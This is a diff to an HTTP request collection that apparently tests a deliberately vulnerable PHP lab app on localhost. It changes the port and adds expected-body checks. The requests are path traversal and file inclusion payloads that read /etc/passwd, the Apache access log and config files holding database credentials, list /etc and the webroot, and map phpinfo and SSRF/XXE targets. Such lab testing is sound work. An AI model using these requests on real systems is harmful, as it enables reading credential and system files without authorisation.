@@ -14,7 +14,7 @@
 ###   echoes every line, so this is a full arbitrary file read primitive.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=../../../../../../../etc/passwd HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, "root:x:0:0:root:/root:/bin/bash" in the output
 
@@ -23,7 +23,7 @@ Cookie: {{authCookie}}
 ### LFI-02  Read any absolute path - /etc/hostname (container id)
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=/etc/hostname HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, the container hostname; NOT "This file doesn't exist!"
 
@@ -34,8 +34,9 @@ Cookie: {{authCookie}}
 ###   foothold for the log-poisoning technique if this ever hit a real host.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=/var/log/apache2/access.log HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
+### EXPECT-BODY: This file doesn't exist!
 ### Expected: 200, HTTP request lines, or "This file doesn't exist!" if the
 ###           image logs elsewhere - either result is useful recon.
 
@@ -47,7 +48,7 @@ Cookie: {{authCookie}}
 ###   protect anything here.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=config.inc.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, the literal text "<?php" and "$db_username" in the output
 
@@ -59,8 +60,10 @@ Cookie: {{authCookie}}
 ###   entire secret inventory.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_1.php?page=admin/settings.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
+### EXPECT-BODY: <?php
+### EXPECT-BODY: $db_username
 ### Expected: 200, plaintext: $db_username = "root"; $login = "bee"; $password = "bug";
 
 
@@ -69,7 +72,7 @@ Cookie: {{authCookie}}
 ###   directory_traversal_2.php renders the raw listing of <directory>.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_2.php?directory=/etc HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, an index of /etc including "passwd" and "shadow"
 
@@ -78,7 +81,7 @@ Cookie: {{authCookie}}
 ### LFI-07  Directory listing of the webroot itself
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/directory_traversal_2.php?directory=/var/www/html HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, full list of application files - complete source map in one request
 
@@ -89,7 +92,7 @@ Cookie: {{authCookie}}
 ###   variables, and every $_ENV/$_SERVER key.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/phpinfo.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, ~80 KB of PHP configuration output
 
@@ -102,6 +105,6 @@ Cookie: {{authCookie}}
 ###   (XXE-02) - use this request as the map of what to attack.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/ssrf.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 ### Expected: 200, describes the SSRF objective and points at the XXE payload files
